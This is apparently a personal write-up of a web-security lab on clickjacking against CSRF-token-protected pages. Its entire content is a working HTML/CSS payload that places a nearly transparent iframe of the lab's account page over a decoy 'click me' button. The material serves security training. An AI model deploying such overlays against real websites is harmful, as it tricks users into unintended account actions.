# [ClickJacking]: Lab: Basic clickjacking with CSRF token protection (1)

---

![Untitled](%5BClickJacking%5D%20Lab%20Basic%20clickjacking%20with%20CSRF%20to%200f6808c3595c481f9c3bce392ec418ee/Untitled.png)

```jsx
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500;
        opacity: 0.10001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 452px;
        left: 60px;
        z-index: 1;
    }
</style>
<div> <button> click me </button></div>

</div>
<iframe id="target_website" src="https://0a6d003b03f6ec5482f4c14e006c0079.web-security-academy.net/my-account">
</iframe>
```